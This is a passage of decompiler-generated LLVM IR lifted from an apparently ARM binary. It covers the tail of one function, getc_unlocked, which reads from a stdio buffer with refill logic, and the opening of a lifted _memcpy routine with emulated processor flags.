  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13700

dec_label_pc_13700:                               ; preds = %.thread, %dec_label_pc_1368c, %dec_label_pc_136e8, %dec_label_pc_136e0, %dec_label_pc_135fc
  %v0_13700 = load i32, i32* %r5.global-to-local, align 4
  %v2_13708 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13708, i32* @r4, align 4
  store i32 %v6_135cc, i32* @r5, align 4
  store i32 %v9_135cc, i32* @r6, align 4
  store i32 %v12_135cc, i32* @r7, align 4
  store i32 %v15_135cc, i32* @lr, align 4
  ret i32 %v0_13700

; uselistorder directives
  uselistorder i32 %v0_136d4, { 1, 0, 2 }
  uselistorder i32 %v1_136b8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_13670, { 1, 0, 2 }
  uselistorder i32 %v1_1366c, { 0, 2, 1 }
  uselistorder i32 %v1_1362c, { 1, 0 }
  uselistorder i32 %v3_135e4, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_13700, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_136d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_136c0, { 1, 0 }
  uselistorder label %dec_label_pc_1368c, { 1, 0 }
  uselistorder label %dec_label_pc_1365c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_1364c, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_13710 = load i32, i32* @r4, align 4
  store i32 %v3_13710, i32* %stack_var_-12, align 4
  %v6_13710 = load i32, i32* @r5, align 4
  %v9_13710 = load i32, i32* @lr, align 4
  %v0_13714 = load i32, i32* @r0, align 4
  %v1_13714 = add i32 %v0_13714, 16
  %v2_13714 = inttoptr i32 %v1_13714 to i32*
  %v3_13714 = load i32, i32* %v2_13714, align 4
  store i32 %v3_13714, i32* %r2.global-to-local, align 4
  %v1_13718 = add i32 %v0_13714, 24
  %v2_13718 = inttoptr i32 %v1_13718 to i32*
  %v3_13718 = load i32, i32* %v2_13718, align 4
  %v3_1371c = icmp ult i32 %v3_13714, %v3_13718
  store i32 %v0_13714, i32* @r4, align 4
  br i1 %v3_1371c, label %bb, label %dec_label_pc_1373c

bb:                                               ; preds = %entry
  %v2_13728 = inttoptr i32 %v3_13714 to i8*
  %v3_13728 = load i8, i8* %v2_13728, align 1
  %v4_13728 = zext i8 %v3_13728 to i32
  store i32 %v4_13728, i32* %r0.global-to-local, align 4
  %v6_13728 = add i32 %v3_13714, 1
  store i32 %v6_13728, i32* %r2.global-to-local, align 4
  store i32 %v6_13728, i32* %v2_13714, align 4
  br label %dec_label_pc_13828

dec_label_pc_1373c:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  %v1_1373c = inttoptr i32 %v0_13714 to i16*
  %v2_1373c = load i16, i16* %v1_1373c, align 2
  %v3_1373c = zext i16 %v2_1373c to i32
  %v1_13740 = and i32 %v3_1373c, 131
  %tmp25 = icmp ugt i32 %v1_13740, 128
  br i1 %tmp25, label %dec_label_pc_1375c, label %dec_label_pc_1374c

dec_label_pc_1374c:                               ; preds = %dec_label_pc_1373c
  store i32 128, i32* @r1, align 4
  %v0_13750 = call i32 @__stdio_trans2r_o()
  store i32 %v0_13750, i32* %r0.global-to-local, align 4
  %v2_13754 = icmp eq i32 %v0_13750, 0
  br i1 %v2_13754, label %dec_label_pc_1374c.dec_label_pc_1375c_crit_edge, label %dec_label_pc_13824

dec_label_pc_1374c.dec_label_pc_1375c_crit_edge:  ; preds = %dec_label_pc_1374c
  %v0_1375c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_1374c.dec_label_pc_1375c_crit_edge, %dec_label_pc_1373c
  %v2_1379c = phi i32 [ %v0_1375c.pre, %dec_label_pc_1374c.dec_label_pc_1375c_crit_edge ], [ %v0_13714, %dec_label_pc_1373c ]
  %v1_1375c = inttoptr i32 %v2_1379c to i16*
  %v2_1375c = load i16, i16* %v1_1375c, align 2
  %v3_1375c = zext i16 %v2_1375c to i32
  store i32 %v3_1375c, i32* %r2.global-to-local, align 4
  %v1_13760 = and i32 %v3_1375c, 2
  %v2_13760 = icmp eq i32 %v1_13760, 0
  br i1 %v2_13760, label %dec_label_pc_1378c, label %dec_label_pc_13768

dec_label_pc_13768:                               ; preds = %dec_label_pc_1375c
  %tmp26 = urem i16 %v2_1375c, 2
  %v1_13768 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_13768
  %v4_1376c = and i32 %tmp22, 4
  %v5_1376c = add i32 %v4_1376c, %v2_1379c
  %v1_13770 = add i32 %v5_1376c, 36
  %v2_13770 = inttoptr i32 %v1_13770 to i8*
  %v3_13770 = load i8, i8* %v2_13770, align 1
  %v4_13770 = zext i8 %v3_13770 to i32
  %v1_13774 = add nsw i32 %v3_1375c, -1
  store i32 %v1_13774, i32* %r2.global-to-local, align 4
  store i32 %v4_13770, i32* %r0.global-to-local, align 4
  %v2_13780 = add i32 %v2_1379c, 40
  %v3_13780 = inttoptr i32 %v2_13780 to i32*
  store i32 0, i32* %v3_13780, align 4
  %v0_13784 = load i32, i32* %r2.global-to-local, align 4
  %v1_13784 = trunc i32 %v0_13784 to i16
  %v2_13784 = load i32, i32* @r4, align 4
  %v3_13784 = inttoptr i32 %v2_13784 to i16*
  store i16 %v1_13784, i16* %v3_13784, align 2
  br label %dec_label_pc_13828

dec_label_pc_1378c:                               ; preds = %dec_label_pc_1375c
  %v1_1378c = add i32 %v2_1379c, 16
  %v1_13790 = inttoptr i32 %v1_1378c to i32*
  %v2_13790 = load i32, i32* %v1_13790, align 4
  store i32 %v2_13790, i32* @r1, align 4
  %v3_13790 = add i32 %v2_1379c, 20
  %v4_13790 = inttoptr i32 %v3_13790 to i32*
  %v5_13790 = load i32, i32* %v4_13790, align 4
  %v9_13794 = icmp eq i32 %v5_13790, %v2_13790
  br i1 %v9_13794, label %dec_label_pc_137a4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1378c
  %v2_13798 = inttoptr i32 %v2_13790 to i8*
  %v3_13798 = load i8, i8* %v2_13798, align 1
  %v4_13798 = zext i8 %v3_13798 to i32
  store i32 %v4_13798, i32* %r0.global-to-local, align 4
  %v6_13798 = add i32 %v2_13790, 1
  store i32 %v6_13798, i32* @r1, align 4
  store i32 %v6_13798, i32* %v1_13790, align 4
  br label %dec_label_pc_13828

dec_label_pc_137a4:                               ; preds = %dec_label_pc_1378c
  %v1_137a4 = add i32 %v2_1379c, 4
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  %v7_137a8 = icmp eq i32 %v3_137a4, -2
  br i1 %v7_137a8, label %.thread7, label %dec_label_pc_137bc

.thread7:                                         ; preds = %dec_label_pc_137a4
  %v2_137ac = or i16 %v2_1375c, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_137ac, i16* %v1_1375c, align 2
  br label %dec_label_pc_13828

dec_label_pc_137bc:                               ; preds = %dec_label_pc_137a4
  %v1_137bc = and i32 %v3_1375c, 768
  %v2_137bc = icmp eq i32 %v1_137bc, 0
  br i1 %v2_137bc, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_137bc
  %v1_137c4 = load i32, i32* @r5, align 4
  %v3_137c4 = add i32 %v1_137c4, 84
  %v4_137c4 = inttoptr i32 %v3_137c4 to i32*
  %v5_137c4 = load i32, i32* %v4_137c4, align 4
  store i32 %v5_137c4, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_137bc, %bb23
  store i32 79820, i32* @lr, align 4
  %v1_137c8 = xor i1 %v2_137bc, true
  call void @__pseudo_cond_branch(i1 %v1_137c8, i32 ptrtoint (i32* @global_var_d344.195 to i32))
  %v0_137cc = load i32, i32* @r4, align 4
  %v1_137cc = add i32 %v0_137cc, 8
  store i32 %v1_137cc, i32* %r2.global-to-local, align 4
  %v1_137d0 = inttoptr i32 %v1_137cc to i32*
  %v2_137d0 = load i32, i32* %v1_137d0, align 4
  store i32 %v2_137d0, i32* %r2.global-to-local, align 4
  %v3_137d0 = add i32 %v0_137cc, 12
  %v4_137d0 = inttoptr i32 %v3_137d0 to i32*
  %v5_137d0 = load i32, i32* %v4_137d0, align 4
  %v9_137d4 = icmp eq i32 %v5_137d0, %v2_137d0
  br i1 %v9_137d4, label %dec_label_pc_13808, label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %.thread9
  %v2_137dc = add i32 %v0_137cc, 24
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  store i32 %v2_137d0, i32* %v3_137dc, align 4
  %v0_137e0 = load i32, i32* @r4, align 4
  store i32 %v0_137e0, i32* %r0.global-to-local, align 4
  %v2_137e4 = call i32 @__stdio_rfill(i32 %v0_137e0)
  store i32 %v2_137e4, i32* %r0.global-to-local, align 4
  %v2_137e8 = icmp eq i32 %v2_137e4, 0
  br i1 %v2_137e8, label %dec_label_pc_13824, label %dec_label_pc_137f0

dec_label_pc_137f0:                               ; preds = %dec_label_pc_137dc
  %v0_137f0 = load i32, i32* @r4, align 4
  %v1_137f0 = add i32 %v0_137f0, 20
  %v2_137f0 = inttoptr i32 %v1_137f0 to i32*
  %v3_137f0 = load i32, i32* %v2_137f0, align 4
  %v2_137f4 = add i32 %v0_137f0, 24
  %v3_137f4 = inttoptr i32 %v2_137f4 to i32*
  store i32 %v3_137f0, i32* %v3_137f4, align 4
  %v0_137f8 = load i32, i32* @r4, align 4
  %v1_137f8 = add i32 %v0_137f8, 16
  %v2_137f8 = inttoptr i32 %v1_137f8 to i32*
  %v3_137f8 = load i32, i32* %v2_137f8, align 4
  %v1_137fc = inttoptr i32 %v3_137f8 to i8*
  %v2_137fc = load i8, i8* %v1_137fc, align 1
  %v3_137fc = zext i8 %v2_137fc to i32
  store i32 %v3_137fc, i32* %r0.global-to-local, align 4
  %v5_137fc = add i32 %v3_137f8, 1
  store i32 %v5_137fc, i32* %v2_137f8, align 4
  br label %dec_label_pc_13828

dec_label_pc_13808:                               ; preds = %.thread9
  %v1_13808 = inttoptr i32 %v0_137cc to i16*
  store i32 %v0_137cc, i32* %r0.global-to-local, align 4
  %v2_1380c = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_1380c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_13814 = call i32 @__stdio_READ(i16* %v1_13808, i32 %v2_1380c, i32 1)
  store i32 %v5_13814, i32* %r0.global-to-local, align 4
  %v2_13818 = icmp eq i32 %v5_13814, 0
  br i1 %v2_13818, label %dec_label_pc_13824, label %bb24

bb24:                                             ; preds = %dec_label_pc_13808
  %v4_1381c = load i8, i8* %stack_var_-17, align 1
  %v5_1381c = sext i8 %v4_1381c to i32
  store i32 %v5_1381c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13828

dec_label_pc_13824:                               ; preds = %dec_label_pc_13808, %dec_label_pc_1374c, %dec_label_pc_137dc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_137f0, %dec_label_pc_13768, %dec_label_pc_13824
  %v2_1382c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1382c, i32* @r4, align 4
  store i32 %v6_13710, i32* @r5, align 4
  store i32 %v9_13710, i32* @lr, align 4
  %v1_13830 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13830

; uselistorder directives
  uselistorder i32 %v2_13790, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1379c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_13714, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_13828, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_13824, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_13840 = load i32, i32* @r1, align 4
  %v1_13840 = load i32, i32* %r0.global-to-local, align 4
  %v2_13840 = sub i32 %v0_13840, %v1_13840
  %v3_13840 = icmp ult i32 %v0_13840, %v1_13840
  %v4_13840 = xor i32 %v1_13840, %v0_13840
  %v5_13840 = xor i32 %v2_13840, %v0_13840
  %v6_13840 = and i32 %v5_13840, %v4_13840
  %v7_13840 = icmp slt i32 %v6_13840, 0
  store i1 %v7_13840, i1* %cpsr_v.global-to-local, align 1
  %v8_13840 = icmp slt i32 %v2_13840, 0
  store i1 %v8_13840, i1* %cpsr_n.global-to-local, align 1
  %v9_13840 = icmp eq i32 %v0_13840, %v1_13840
  store i1 %v9_13840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13840, label %dec_label_pc_13a94, label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %entry
  br i1 %v9_13840, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_13848
  %merge = phi i32 [ %v0_13840, %dec_label_pc_13848 ], [ %v2_13b28, %bb150 ], [ %v11_13b44, %bb153 ], [ %v7_13b44, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13848
  %v5_1384c = inttoptr i32 %v1_13840 to i8*
  store i8* %v5_1384c, i8** %stack_var_-8, align 4
  %v8_1384c = load i32, i32* @lr, align 4
  %v0_13850 = load i32, i32* @r2, align 4
  %v2_13850 = add i32 %v0_13850, -4
  store i32 %v2_13850, i32* %r2.global-to-local, align 4
  %v4_13850 = sub i32 3, %v0_13850
  %v5_13850 = and i32 %v4_13850, %v0_13850
  %v6_13850 = icmp slt i32 %v5_13850, 0
  store i1 %v6_13850, i1* %cpsr_v.global-to-local, align 1
  %v7_13850 = icmp slt i32 %v2_13850, 0
  store i1 %v7_13850, i1* %cpsr_n.global-to-local, align 1
  %v8_13850 = icmp eq i32 %v0_13850, 4
  store i1 %v8_13850, i1* %cpsr_z.global-to-local, align 1
  %v5_13854 = icmp slt i32 %v0_13850, 4
  br i1 %v5_13854, label %bb140, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %bb
  %v1_13858 = urem i32 %v1_13840, 4
  store i32 %v1_13858, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13858 = icmp eq i32 %v1_13858, 0
  store i1 %v2_13858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13858, label %dec_label_pc_13860, label %dec_label_pc_1390c

dec_label_pc_13860:                               ; preds = %dec_label_pc_13858
  %v1_13860 = urem i32 %v0_13840, 4
  store i32 %v1_13860, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13860 = icmp eq i32 %v1_13860, 0
  store i1 %v2_13860, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_13840 to i2
  br i1 %v2_13860, label %dec_label_pc_13868, label %dec_label_pc_1393c

dec_label_pc_13868:                               ; preds = %dec_label_pc_13860, %dec_label_pc_13934
  %v0_1388093 = phi i32 [ %v1_13840, %dec_label_pc_13860 ], [ %v0_13a5c76, %dec_label_pc_13934 ]
  %v0_1387c92 = phi i32 [ %v0_13840, %dec_label_pc_13860 ], [ %v0_13934, %dec_label_pc_13934 ]
  %v0_13868 = phi i32 [ %v2_13850, %dec_label_pc_13860 ], [ %v2_1392c, %dec_label_pc_13934 ]
  %v1_13868 = add i32 %v0_13868, -8
  store i32 %v1_13868, i32* %r2.global-to-local, align 4
  %v3_13868 = sub i32 7, %v0_13868
  %v4_13868 = and i32 %v3_13868, %v0_13868
  %v5_13868 = icmp slt i32 %v4_13868, 0
  store i1 %v5_13868, i1* %cpsr_v.global-to-local, align 1
  %v6_13868 = icmp slt i32 %v1_13868, 0
  store i1 %v6_13868, i1* %cpsr_n.global-to-local, align 1
  %v7_13868 = icmp eq i32 %v0_13868, 8
  store i1 %v7_13868, i1* %cpsr_z.global-to-local, align 1
  %v2_1386c = xor i1 %v6_13868, %v5_13868
  br i1 %v2_1386c, label %dec_label_pc_138bc, label %dec_label_pc_13870

dec_label_pc_13870:                               ; preds = %dec_label_pc_13868
  %v1_13870 = add i32 %v0_13868, -28
  store i32 %v1_13870, i32* %r2.global-to-local, align 4
  %v3_13870 = sub i32 27, %v0_13868
  %v4_13870 = and i32 %v3_13870, %v1_13868
  %v5_13870 = icmp slt i32 %v4_13870, 0
  store i1 %v5_13870, i1* %cpsr_v.global-to-local, align 1
  %v6_13870 = icmp slt i32 %v1_13870, 0
  store i1 %v6_13870, i1* %cpsr_n.global-to-local, align 1
  %v7_13870 = icmp eq i32 %v1_13868, 20
  store i1 %v7_13870, i1* %cpsr_z.global-to-local, align 1
  %v2_13874 = xor i1 %v6_13870, %v5_13870
  br i1 %v2_13874, label %dec_label_pc_138a8, label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13870
  %v0_13878 = load i32, i32* @r4, align 4
  store i32 %v0_13878, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_1387c.dec_label_pc_1387c_crit_edge, %dec_label_pc_13878
  %v0_13880 = phi i32 [ %v12_13888, %dec_label_pc_1387c.dec_label_pc_1387c_crit_edge ], [ %v0_1388093, %dec_label_pc_13878 ]
  %v0_1387c = phi i32 [ %v0_1387c.pre, %dec_label_pc_1387c.dec_label_pc_1387c_crit_edge ], [ %v0_1387c92, %dec_label_pc_13878 ]
  %v1_1387c = inttoptr i32 %v0_1387c to i32*
  %v2_1387c = load i32, i32* %v1_1387c, align 4
  %v3_1387c = add i32 %v0_1387c, 4
  %v4_1387c = inttoptr i32 %v3_1387c to i32*
  %v5_1387c = load i32, i32* %v4_1387c, align 4
  store i32 %v5_1387c, i32* %r4.global-to-local, align 4
  %v6_1387c = add i32 %v0_1387c, 8
  %v7_1387c = inttoptr i32 %v6_1387c to i32*
  %v8_1387c = load i32, i32* %v7_1387c, align 4
  store i32 %v8_1387c, i32* %ip.global-to-local, align 4
  %v9_1387c = add i32 %v0_1387c, 12
  %v10_1387c = inttoptr i32 %v9_1387c to i32*
  %v11_1387c = load i32, i32* %v10_1387c, align 4
  store i32 %v11_1387c, i32* %lr.global-to-local, align 4
  %v12_1387c = add i32 %v0_1387c, 16
  store i32 %v12_1387c, i32* %r1.global-to-local, align 4
  %v1_13880 = inttoptr i32 %v0_13880 to i32*
  store i32 %v2_1387c, i32* %v1_13880, align 4
  %v3_13880 = add i32 %v0_13880, 4
  %v4_13880 = inttoptr i32 %v3_13880 to i32*
  %v5_13880 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13880, i32* %v4_13880, align 4
  %v6_13880 = add i32 %v0_13880, 8
  %v7_13880 = inttoptr i32 %v6_13880 to i32*
  %v8_13880 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_13880, i32* %v7_13880, align 4
  %v9_13880 = add i32 %v0_13880, 12
  %v10_13880 = inttoptr i32 %v9_13880 to i32*
  %v11_13880 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13880, i32* %v10_13880, align 4
  %v12_13880 = add i32 %v0_13880, 16
  store i32 %v12_13880, i32* %r0.global-to-local, align 4
  %v0_13884 = load i32, i32* %r1.global-to-local, align 4
  %v1_13884 = inttoptr i32 %v0_13884 to i32*
  %v2_13884 = load i32, i32* %v1_13884, align 4
  store i32 %v2_13884, i32* @r3, align 4
  %v3_13884 = add i32 %v0_13884, 4
  %v4_13884 = inttoptr i32 %v3_13884 to i32*
  %v5_13884 = load i32, i32* %v4_13884, align 4
  store i32 %v5_13884, i32* %r4.global-to-local, align 4
  %v6_13884 = add i32 %v0_13884, 8
  %v7_13884 = inttoptr i32 %v6_13884 to i32*
  %v8_13884 = load i32, i32* %v7_13884, align 4
  store i32 %v8_13884, i32* @ip, align 4
  %v9_13884 = add i32 %v0_13884, 12
  %v10_13884 = inttoptr i32 %v9_13884 to i32*
  %v11_13884 = load i32, i32* %v10_13884, align 4
  store i32 %v11_13884, i32* %lr.global-to-local, align 4
  %v12_13884 = add i32 %v0_13884, 16
  store i32 %v12_13884, i32* @r1, align 4
  %v1_13888 = inttoptr i32 %v12_13880 to i32*
  store i32 %v2_13884, i32* %v1_13888, align 4
  %v3_13888 = add i32 %v0_13880, 20
  %v4_13888 = inttoptr i32 %v3_13888 to i32*
  %v5_13888 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13888, i32* %v4_13888, align 4
  %v6_13888 = add i32 %v0_13880, 24
  %v7_13888 = inttoptr i32 %v6_13888 to i32*
  %v8_13888 = load i32, i32* @ip, align 4
  store i32 %v8_13888, i32* %v7_13888, align 4
  %v9_13888 = add i32 %v0_13880, 28
  %v10_13888 = inttoptr i32 %v9_13888 to i32*
  %v11_13888 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13888, i32* %v10_13888, align 4
  %v12_13888 = add i32 %v0_13880, 32
  store i32 %v12_13888, i32* %r0.global-to-local, align 4
  %v0_1388c = load i32, i32* %r2.global-to-local, align 4
  %v1_1388c = add i32 %v0_1388c, -32
  store i32 %v1_1388c, i32* %r2.global-to-local, align 4
  %v3_1388c = sub i32 31, %v0_1388c
  %v4_1388c = and i32 %v3_1388c, %v0_1388c
  %v5_1388c = icmp slt i32 %v4_1388c, 0
  %v6_1388c = icmp slt i32 %v1_1388c, 0
  %v2_13890 = xor i1 %v6_1388c, %v5_1388c
  br i1 %v2_13890, label %dec_label_pc_13894, label %dec_label_pc_1387c.dec_label_pc_1387c_crit_edge

dec_label_pc_1387c.dec_label_pc_1387c_crit_edge:  ; preds = %dec_label_pc_1387c
  %v0_1387c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1387c

dec_label_pc_13894:                               ; preds = %dec_label_pc_1387c
  %v1_13894 = add i32 %v0_1388c, -16
  %v3_13894 = add i32 %v0_1388c, 2147483616
  %v4_13894 = and i32 %v1_13894, %v3_13894
  %v5_13894 = icmp slt i32 %v4_13894, 0
  store i1 %v5_13894, i1* %cpsr_v.global-to-local, align 1
  %v6_13894 = icmp slt i32 %v1_13894, 0
  store i1 %v6_13894, i1* %cpsr_n.global-to-local, align 1
  %v7_13894 = icmp eq i32 %v1_13894, 0
  store i1 %v7_13894, i1* %cpsr_z.global-to-local, align 1
  %v2_13898 = xor i1 %v6_13894, %v5_13894
  br i1 %v2_13898, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_13894
  %v3_13898 = load i32, i32* @r1, align 4
  %v4_13898 = inttoptr i32 %v3_13898 to i32*
  %v5_13898 = load i32, i32* %v4_13898, align 4
  store i32 %v5_13898, i32* @r3, align 4
  %v6_13898 = add i32 %v3_13898, 4
  %v7_13898 = inttoptr i32 %v6_13898 to i32*
  %v8_13898 = load i32, i32* %v7_13898, align 4
  store i32 %v8_13898, i32* %r4.global-to-local, align 4
  %v9_13898 = add i32 %v3_13898, 8
  %v10_13898 = inttoptr i32 %v9_13898 to i32*
  %v11_13898 = load i32, i32* %v10_13898, align 4
  store i32 %v11_13898, i32* @ip, align 4
  %v12_13898 = add i32 %v3_13898, 12
  %v13_13898 = inttoptr i32 %v12_13898 to i32*
  %v14_13898 = load i32, i32* %v13_13898, align 4
  store i32 %v14_13898, i32* %lr.global-to-local, align 4
  %v15_13898 = add i32 %v3_13898, 16
  store i32 %v15_13898, i32* @r1, align 4
  %v4_1389c = inttoptr i32 %v12_13888 to i32*
  store i32 %v5_13898, i32* %v4_1389c, align 4
  %v6_1389c = add i32 %v0_13880, 36
  %v7_1389c = inttoptr i32 %v6_1389c to i32*
  %v8_1389c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1389c, i32* %v7_1389c, align 4
  %v9_1389c = add i32 %v0_13880, 40
  %v10_1389c = inttoptr i32 %v9_1389c to i32*
  %v11_1389c = load i32, i32* @ip, align 4
  store i32 %v11_1389c, i32* %v10_1389c, align 4
  %v12_1389c = add i32 %v0_13880, 44
  %v13_1389c = inttoptr i32 %v12_1389c to i32*
  %v14_1389c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1389c, i32* %v13_1389c, align 4
  %v15_1389c = add i32 %v0_13880, 48
  store i32 %v15_1389c, i32* %r0.global-to-local, align 4
  %v3_138a0 = load i32, i32* %r2.global-to-local, align 4
  %v4_138a0 = add i32 %v3_138a0, -16
  store i32 %v4_138a0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_13894, %bb136
  %v3_138b0101110 = phi i32 [ %v15_1389c, %bb136 ], [ %v12_13888, %dec_label_pc_13894 ]
  %v0_138a8.pre = phi i32 [ %v4_138a0, %bb136 ], [ %v1_1388c, %dec_label_pc_13894 ]
  %v2_138a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_138a4, i32* @r4, align 4
  br label %dec_label_pc_138a8

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13870, %bb137
  %v3_138b0100 = phi i32 [ %v0_1388093, %dec_label_pc_13870 ], [ %v3_138b0101110, %bb137 ]
  %v0_138a8 = phi i32 [ %v1_13870, %dec_label_pc_13870 ], [ %v0_138a8.pre, %bb137 ]
  %v1_138a8 = add i32 %v0_138a8, 20
  store i32 %v1_138a8, i32* %r2.global-to-local, align 4
  %v3_138a8 = sub i32 0, %v0_138a8
  %v4_138a8 = and i32 %v1_138a8, %v3_138a8
  %v5_138a8 = icmp slt i32 %v4_138a8, 0
  store i1 %v5_138a8, i1* %cpsr_v.global-to-local, align 1
  %v6_138a8 = icmp slt i32 %v1_138a8, 0
  store i1 %v6_138a8, i1* %cpsr_n.global-to-local, align 1
  %v7_138a8 = icmp eq i32 %v1_138a8, 0
  store i1 %v7_138a8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_138ac

dec_label_pc_138ac:                               ; preds = %.thread114, %dec_label_pc_138a8
  %v0_138bc.pre157 = phi i32 [ %v0_138bc.pre, %.thread114 ], [ %v1_138a8, %dec_label_pc_138a8 ]
  %v3_138b0 = phi i32 [ %v3_138b098115, %.thread114 ], [ %v3_138b0100, %dec_label_pc_138a8 ]
  %v1_138b4 = phi i1 [ %v1_138b8, %.thread114 ], [ %v5_138a8, %dec_label_pc_138a8 ]
  %v0_138b4 = phi i1 [ %v0_138b8, %.thread114 ], [ %v6_138a8, %dec_label_pc_138a8 ]
  %v2_138ac = xor i1 %v1_138b4, %v0_138b4
  br i1 %v2_138ac, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_138ac
  %v3_138ac = load i32, i32* @r1, align 4
  %v4_138ac = inttoptr i32 %v3_138ac to i32*
  %v5_138ac = load i32, i32* %v4_138ac, align 4
  store i32 %v5_138ac, i32* @r3, align 4
  %v6_138ac = add i32 %v3_138ac, 4
  %v7_138ac = inttoptr i32 %v6_138ac to i32*
  %v8_138ac = load i32, i32* %v7_138ac, align 4
  store i32 %v8_138ac, i32* @ip, align 4
  %v9_138ac = add i32 %v3_138ac, 8
  %v10_138ac = inttoptr i32 %v9_138ac to i32*
  %v11_138ac = load i32, i32* %v10_138ac, align 4
  store i32 %v11_138ac, i32* %lr.global-to-local, align 4
  %v12_138ac = add i32 %v3_138ac, 12
  store i32 %v12_138ac, i32* @r1, align 4
  %v4_138b0 = inttoptr i32 %v3_138b0 to i32*
  store i32 %v5_138ac, i32* %v4_138b0, align 4
  %v6_138b0 = add i32 %v3_138b0, 4
  %v7_138b0 = inttoptr i32 %v6_138b0 to i32*
  %v8_138b0 = load i32, i32* @ip, align 4
  store i32 %v8_138b0, i32* %v7_138b0, align 4
  %v9_138b0 = add i32 %v3_138b0, 8
  %v10_138b0 = inttoptr i32 %v9_138b0 to i32*
  %v11_138b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_138b0, i32* %v10_138b0, align 4
  %v12_138b0 = add i32 %v3_138b0, 12
  store i32 %v12_138b0, i32* %r0.global-to-local, align 4
